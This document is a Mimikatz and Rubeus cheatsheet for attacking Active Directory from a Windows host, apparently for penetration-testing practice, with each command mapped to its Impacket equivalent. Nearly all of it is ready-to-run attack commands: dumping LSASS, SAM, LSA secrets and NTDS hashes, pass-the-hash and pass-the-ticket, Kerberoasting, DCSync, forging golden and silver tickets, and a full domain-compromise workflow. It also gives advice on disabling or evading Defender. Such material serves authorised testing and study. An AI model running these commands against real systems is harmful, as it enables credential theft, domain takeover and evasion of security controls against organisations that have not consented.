# Mimikatz Cheatsheet (Windows-Native AD Attacks)

> For handling AD attacks ON a Windows host (via RDP) instead of remotely from Kali. Each section maps the Impacket (Kali) equivalent to the Mimikatz (Windows) command.
>
> **Note:** Mimikatz is heavily flagged by Defender. Add an exclusion for your tools folder, disable Defender if you have admin, or run in memory. Keep a copy in your Kali to transfer.

---

## Setup — Every Session Starts With

```
mimikatz.exe
privilege::debug        # enable SeDebugPrivilege (needs admin) - MUST succeed
token::elevate          # elevate to SYSTEM (needed for some commands)
```

If `privilege::debug` returns `Privilege '20' OK` you're good. If it errors, you're not admin — Mimikatz won't work.

---

## 1. Dumping Credentials from Memory (LSASS)

**Impacket equivalent:** `impacket-secretsdump` (remote)
**Mimikatz (on host):**

```
privilege::debug
sekurlsa::logonpasswords          # dump all logged-on users' creds (plaintext + NTLM)
```

Other useful dumps:
```
sekurlsa::wdigest                 # older systems - may show plaintext
sekurlsa::msv                     # NTLM hashes specifically
sekurlsa::kerberos                # Kerberos credentials
```

**What you get:** plaintext passwords (older/misconfigured systems) and NTLM hashes for every user with a session on this machine.

---

## 2. Dumping the SAM (Local Account Hashes)

**Impacket equivalent:** `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
**Mimikatz (on host):**

```
privilege::debug
token::elevate
lsadump::sam                      # dump local SAM hashes
```

**What you get:** local account NTLM hashes (including local Administrator).

---

## 3. Dumping LSA Secrets

**Impacket equivalent:** `impacket-secretsdump` (LSA portion)
**Mimikatz (on host):**

```
privilege::debug
token::elevate
lsadump::secrets                  # cached secrets, service account passwords
```

---

## 4. Pass-the-Hash

**Impacket equivalent:** `impacket-psexec -hashes :<NTLM> corp.com/user@target`
**Mimikatz (on host):**

```
privilege::debug
sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:<NTLM_hash> /run:cmd.exe
```

This spawns a new cmd.exe running as the target user (using their hash). From that cmd, you can access remote resources as them:
```cmd
dir \\web04\c$
```

---

## 5. AS-REP Roasting

**Impacket equivalent:** `impacket-GetNPUsers corp.com/user -request`
**Mimikatz:** Mimikatz doesn't roast directly — use **Rubeus** on Windows:

```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

Crack: `hashcat -m 18200 asrep.txt rockyou.txt`

---

## 6. Kerberoasting

**Impacket equivalent:** `impacket-GetUserSPNs corp.com/user:pass -request`
**Mimikatz/Rubeus (on host):**

```cmd
Rubeus.exe kerberoast /outfile:kerb.txt
```

Or extract tickets with Mimikatz then crack:
```
kerberos::list /export           # export TGS tickets to .kirbi files
```

Crack: `hashcat -m 13100 kerb.txt rockyou.txt`

---

## 7. Overpass-the-Hash (Hash → Kerberos Ticket)

**Impacket equivalent:** `impacket-getTGT -hashes :<NTLM>` then use ccache
**Mimikatz (on host):**

```
privilege::debug
sekurlsa::pth /user:jen /domain:corp.com /ntlm:<NTLM_hash> /run:powershell.exe
```

The spawned PowerShell can request Kerberos tickets using the hash. Confirm with `klist` in the new window.

**Rubeus alternative (cleaner):**
```cmd
Rubeus.exe asktgt /user:jen /rc4:<NTLM_hash> /ptt
klist
```

---

## 8. Pass-the-Ticket

**Impacket equivalent:** `export KRB5CCNAME=ticket.ccache` then `-k -no-pass`
**Mimikatz (on host):**

```
privilege::debug
sekurlsa::tickets /export         # export all tickets from memory to .kirbi files
kerberos::ptt <ticket>.kirbi      # inject a chosen ticket into your session
```

Then verify and use:
```cmd
klist                             # confirm the ticket is loaded
dir \\web04\backup                # access as the ticket's owner
```

---

## 9. DCSync (Dump Domain Hashes Remotely)

**Impacket equivalent:** `impacket-secretsdump corp.com/user:pass@DC -just-dc-user Administrator`
**Mimikatz (on host):**

```
privilege::debug
lsadump::dcsync /domain:corp.com /user:Administrator     # dump one user
lsadump::dcsync /domain:corp.com /user:krbtgt            # dump KRBTGT (for golden ticket)
lsadump::dcsync /domain:corp.com /all                    # dump all (verbose)
```

**Criteria:** the account running this needs replication rights (DS-Replication-Get-Changes[-All]) — Domain Admin has them, or a misconfigured account. Does NOT require a shell on the DC — works from any domain machine with the right account.

---

## 10. Dumping NTDS.dit (on the DC)

**Impacket equivalent:** `impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL`
**Mimikatz (on the DC):**

```
privilege::debug
token::elevate
lsadump::lsa /patch               # dump hashes from LSASS on the DC (incl. KRBTGT)
```

`/patch` patches LSASS to read secrets. Run ON the DC with admin/SYSTEM.

---

## 11. Silver Ticket (Forge TGS for One Service)

**Impacket equivalent:** `impacket-ticketer -spn cifs/host ...`
**Mimikatz (on host):**

```
kerberos::golden /user:Administrator /domain:corp.com /sid:<DOMAIN_SID> /target:web04.corp.com /service:cifs /rc4:<SERVICE_or_MACHINE_hash> /ptt
```

Note: Mimikatz uses `kerberos::golden` for BOTH silver and golden — the difference is:
- **Silver:** supply `/target` + `/service` + a **service/machine account hash**
- **Golden:** supply the **KRBTGT hash**, no `/target` needed

---

## 12. Golden Ticket (Forge TGT for Whole Domain)

**Impacket equivalent:** `impacket-ticketer -nthash <KRBTGT> ...`
**Mimikatz (on host):**

```
kerberos::golden /user:Administrator /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_hash> /ptt
```

Then spawn a shell that uses the injected ticket:
```
misc::cmd                         # opens a cmd with the ticket in context
```

**Criteria:** need the KRBTGT hash (from DCSync). This is persistence — you already own the domain by this point.

---

## Getting the Domain SID (needed for tickets)

```cmd
whoami /user
# Result: S-1-5-21-1987370270-658905905-1781884369-1106
# Domain SID = everything EXCEPT the last -1106
```
Or in PowerView: `Get-DomainSID`

---

## RDP-Based AD Attack Workflow (your preferred medium)

```
1. RDP into a compromised host as your foothold user
   xfreerdp3 /u:user /p:'pass' /d:<domain> /v:<target> /cert:ignore /drive:shared,/home/wai

2. Transfer mimikatz + rubeus (via SMB, shared drive, or /home http)
   - Watch for Defender - exclude your tools folder or disable AV

3. Open elevated cmd/powershell, run mimikatz
   privilege::debug
   token::elevate

4. Dump creds from this host
   sekurlsa::logonpasswords
   lsadump::sam

5. If a privileged user's creds/tickets are here:
   - Pass-the-hash: sekurlsa::pth /user:X /ntlm:HASH /run:cmd.exe
   - Pass-the-ticket: sekurlsa::tickets /export -> kerberos::ptt X.kirbi

6. If you have replication rights:
   lsadump::dcsync /domain:corp.com /user:Administrator

7. Use dumped Administrator hash to move to the DC
   (pass-the-hash spawned shell -> dir \\dc1\c$ -> psexec-style access)

8. On the DC: lsadump::lsa /patch  OR  dump NTDS -> full domain hashes
```

---

## Impacket ↔ Mimikatz Quick Map

| Attack | Impacket (Kali) | Mimikatz/Rubeus (Windows) |
|--------|-----------------|---------------------------|
| Dump memory creds | `secretsdump @target` | `sekurlsa::logonpasswords` |
| Dump SAM | `secretsdump -sam` | `lsadump::sam` |
| Pass-the-Hash | `psexec -hashes` | `sekurlsa::pth /ntlm:` |
| AS-REP roast | `GetNPUsers -request` | `Rubeus asreproast` |
| Kerberoast | `GetUserSPNs -request` | `Rubeus kerberoast` |
| Overpass-the-Hash | `getTGT -hashes` | `sekurlsa::pth` or `Rubeus asktgt /ptt` |
| Pass-the-Ticket | `KRB5CCNAME` + `-k` | `sekurlsa::tickets /export` + `kerberos::ptt` |
| DCSync | `secretsdump -just-dc-user` | `lsadump::dcsync /user:` |
| Silver ticket | `ticketer -spn` | `kerberos::golden /target /service` |
| Golden ticket | `ticketer -nthash <krbtgt>` | `kerberos::golden /krbtgt:` |

---

## Key Notes

- `privilege::debug` + `token::elevate` first, every session.
- Mimikatz needs **admin/SYSTEM** — it reads protected memory.
- **Defender WILL flag mimikatz.exe** — exclude your folder, disable AV (if admin), or run obfuscated/in-memory versions.
- On Windows medium (RDP), Mimikatz + Rubeus together cover everything Impacket does from Kali.
- Domain SID = any account's SID minus the final RID (`-XXXX`).
- For DCSync you only need replication rights, NOT a shell on the DC.
- After pass-the-hash / pass-the-ticket, verify with `klist` and test with `dir \\host\c$`.

---

## References
- Mimikatz: https://github.com/gentilkiwi/mimikatz
- Rubeus: https://github.com/GhostPack/Rubeus
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
